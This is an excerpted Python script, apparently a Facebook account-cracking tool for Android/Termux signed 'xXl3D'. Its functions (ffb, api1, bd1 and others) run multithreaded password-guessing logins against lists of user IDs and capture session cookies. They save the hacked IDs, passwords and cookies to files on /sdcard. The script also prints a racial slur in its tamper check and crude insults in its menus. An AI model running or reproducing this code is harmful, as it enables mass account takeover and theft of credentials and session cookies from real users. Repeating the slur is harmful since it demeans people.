...
print('\n \033[1;32m[√]\033[1;37m Wᴀɪᴛ Cʜᴇᴄᴋɪɴɢ Mᴏᴅᴜʟᴇs...!')
...
if not 'print' in open(first+'sessions.py','r').read():
	...
	exit('\33[1;91mPʟᴇᴀsᴇ Tʀʏ Tʜɪs Lᴏᴄᴀʟ Mᴇᴛʜᴏᴅ Cᴀᴘᴛᴜʀᴇ Oɴ Kɪᴅs ')	 
...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m N'+'igga'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY xXl3D');exit()
        else:exit()
    except:exit()
####### MODL KILLER #######
...
────────────────────────────────────────────────────────────────────────────────────
\033[1;37m-----------------------------------------------
\033[1;37m FACEBOOK    :  led missubalikkana 💗💗💗 \033[92;1m•
\033[1;37m 󰟵 GITHUB    : @xXl3D
\033[1;37m 󰦂 VERSION   : \033[92;1m6\033[92;1m.\033[92;1m0
\033[1;37m═══════════════════════════════════════════════
...
def menu():
    try:
                ...
                if x == ("***"):
                        ...
                        print('[0] EXIT ')
                        line()
                        xd=input(' PILIA ANG INCHAKTO NGA TAWO: ')
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' MGA BABAYE NIMO : \033[1;32m'+total_ids+f' ')
                                        print("\033[1;37m ARI GA SUGOD NA PALIHUG HULAT...\033[1;37m")
                                        line()
                                        for user in fo:
...
def pak():
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        tl = str(len(user))
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mMGA BABAYE NIMO: \033[1;97m'+tl)
...
def gmail():
                ...
                with tred(max_workers=30) as S1N:
                        total = str(len(fo))
                        clear()
                        print(' MGA BABAYE NIMO: \033[1;32m'+total)
...
def ffb(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in Aws:
                                ...
                                if 'y' in pcp:
                                        #print('\r\r\x1b[38;5;208m [SHVNI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHVNI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSHVNI\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				open('/sdcard/SHVNI-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
	...
	try:
		...
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/SHVNI-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
				...
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [SHVNI-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/SHVNI-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bd1(ids,passlist):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [SHVNI-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/SHVNI-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print(f'\r\r\033[1;33m [SHVNI-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/SHVNI-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mSHVNI-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSHVNI\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
